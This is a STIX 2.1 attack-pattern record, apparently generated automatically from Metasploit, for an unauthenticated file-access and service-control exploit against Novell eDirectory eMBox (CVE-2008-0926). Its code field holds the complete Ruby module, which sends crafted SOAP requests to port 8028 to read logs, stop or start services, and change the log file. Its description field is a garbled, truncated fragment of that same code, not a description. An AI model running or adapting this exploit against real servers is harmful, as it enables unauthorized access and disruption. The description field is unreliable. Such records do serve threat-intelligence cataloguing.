{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97532f9d-c997-4cdd-b4c4-801b199982bd",
    "created": "2024-08-14T16:22:46.616417Z",
    "modified": "2024-08-14T16:22:46.616421Z",
    "name": "Novell eDirectory eMBox Unauthenticated File Access",
    "description": "Read Log File 'CMD'         => 'logger.setloginfo' 'PATTERN'     => /<Logger:Message dt=\"Binary\">(.*)<\\/Logger:Message>/ 'PARAM'       => '<Parameters><params><logFile>__PARAM__</logFile>'+ '<logOptionAppend/></params></Parameters>' 'USE_PARAM'   => true  ] ] 'DefaultAction'  => 'LIST_SERVICES' ))  register_options( [ Opt::RPORT(8028) OptString.new(\"PARAM\", [false, 'Specify a parameter for the action']) ]) end  def run  if action.opts['USE_PARAM'] if datastore['PARAM'].nil? or datastore['PARAM'].empty? print_error(\"You must supply a parameter for action: #{action.name}\") return else param = action.opts['PARAM'].gsub(/__PARAM__/, datastore['PARAM']) end else param = '<Parameters><params/></Parameters>' end  template = %Q|<?xml version=\"1.0\"?> <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"> <SOAP-ENV:Header/> <SOAP-ENV:Body> <dispatch> <Action>#{action.opts['CMD']}</Action> <Object/>#{param}</dispatch> </SOAP-ENV:Body> </SOAP-ENV:Envelope>|  template = template.gsub(/^ {4}/, '') template = template.gsub(/\\n/, '')  connect print_status(\"Sending command: #{action.name}...\") res = send_request_cgi({ 'method'   => 'POST' 'uri'      => '/SOAP' 'data'     => template + \"\\n\\n\" 'headers'  => { 'Content-Type' => 'text/xml' 'SOAPAction' => \"\\\"\" + Rex::Text.rand_text_alpha_upper(rand(25) + 1) + \"\\\"\"  }, 25)  if res.nil? print_error(\"Did not get a response from server\") return end  raw_data = res.body.scan(/#{action.opts['PATTERN']}/).flatten[0] print_line(\"\\n\" + Rex::Text.decode_base64(raw_data))  disconnect end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/edirectory/edirectory_edirutil.rb",
            "external_id": "edirectory_edirutil.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell eDirectory eMBox Unauthenticated File Access',\n      'Description'    => %q{\n          This module will access Novell eDirectory's eMBox service and can run the\n        following actions via the SOAP interface: GET_DN, READ_LOGS, LIST_SERVICES,\n        STOP_SERVICE, START_SERVICE, SET_LOGFILE.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2008-0926' ],\n          [ 'BID', '28441' ],\n          [ 'OSVDB', '43690' ]\n        ],\n      'Author'         =>\n        [\n          'Nicob',\n          'MC',    #Initial Metasploit module\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          [\n            'GET_DN',\n            {\n              'Description' => 'Get DN',\n              'CMD'         => 'novell.embox.connmgr.serverinfo',\n              'PATTERN'     => /<ServerDN dt=\"Binary\">(.*)<\\/ServerDN>/,\n              'USE_PARAM'   => false\n            }\n          ],\n          [\n            'READ_LOGS',\n            {\n              'Description' => 'Read all the log files',\n              'CMD'         => 'logger.readlog',\n              'PATTERN'     => /<LogFileData>(.*)<\\/LogFileData>/,\n              'USE_PARAM'   => false\n            }\n          ],\n          [\n            'LIST_SERVICES',\n            {\n              'Description' => 'List services',\n              'CMD'         => 'novell.embox.service.getServiceList',\n              'PATTERN'     => /<DSService:Message dt=\\\"Binary\\\">(.*)<\\/DSService:Message>/,\n              'USE_PARAM'   => false\n            }\n          ],\n          [\n            'STOP_SERVICE',\n            {\n              'Description' => 'Stop a service',\n              'CMD'         => 'novell.embox.service.stopService',\n              'PATTERN'     => /<DSService:Message dt=\"Binary\">(.*)<\\/DSService:Message>/,\n              'PARAM'       => '<Parameters><params xmlns:DSService=\"service.dtd\">'+\n                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+\n                               '</params></Parameters>',\n              'USE_PARAM'   => true\n            }\n          ],\n          [\n            'START_SERVICE',\n            {\n              'Description' => 'Start a service',\n              'CMD'         => 'novell.embox.service.startService',\n              'PATTERN'     => /<DSService:Message dt=\"Binary\">(.*)<\\/DSService:Message>/,\n              'PARAM'       => '<Parameters>' +\n                               '<params xmlns:DSService=\"service.dtd\">' +\n                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+\n                               '</params></Parameters>',\n              'USE_PARAM'   => true\n            }\n          ],\n          [\n            'SET_LOGFILE',\n            {\n              'Description' => 'Read Log File',\n              'CMD'         => 'logger.setloginfo',\n              'PATTERN'     => /<Logger:Message dt=\"Binary\">(.*)<\\/Logger:Message>/,\n              'PARAM'       => '<Parameters><params><logFile>__PARAM__</logFile>'+\n                               '<logOptionAppend/></params></Parameters>',\n              'USE_PARAM'   => true\n            }\n          ]\n        ],\n      'DefaultAction'  => 'LIST_SERVICES'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8028),\n        OptString.new(\"PARAM\", [false, 'Specify a parameter for the action'])\n      ])\n  end\n\n  def run\n\n    if action.opts['USE_PARAM']\n      if datastore['PARAM'].nil? or datastore['PARAM'].empty?\n        print_error(\"You must supply a parameter for action: #{action.name}\")\n        return\n      else\n        param = action.opts['PARAM'].gsub(/__PARAM__/, datastore['PARAM'])\n      end\n    else\n      param = '<Parameters><params/></Parameters>'\n    end\n\n    template = %Q|<?xml version=\"1.0\"?>\n    <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <SOAP-ENV:Header/>\n    <SOAP-ENV:Body>\n    <dispatch>\n    <Action>#{action.opts['CMD']}</Action>\n    <Object/>#{param}</dispatch>\n    </SOAP-ENV:Body>\n    </SOAP-ENV:Envelope>|\n\n    template = template.gsub(/^ {4}/, '')\n    template = template.gsub(/\\n/, '')\n\n    connect\n    print_status(\"Sending command: #{action.name}...\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => '/SOAP',\n      'data'     => template + \"\\n\\n\",\n      'headers'  =>\n        {\n          'Content-Type' => 'text/xml',\n          'SOAPAction' => \"\\\"\" + Rex::Text.rand_text_alpha_upper(rand(25) + 1) + \"\\\"\",\n        }\n    }, 25)\n\n    if res.nil?\n      print_error(\"Did not get a response from server\")\n      return\n    end\n\n    raw_data = res.body.scan(/#{action.opts['PATTERN']}/).flatten[0]\n    print_line(\"\\n\" + Rex::Text.decode_base64(raw_data))\n\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}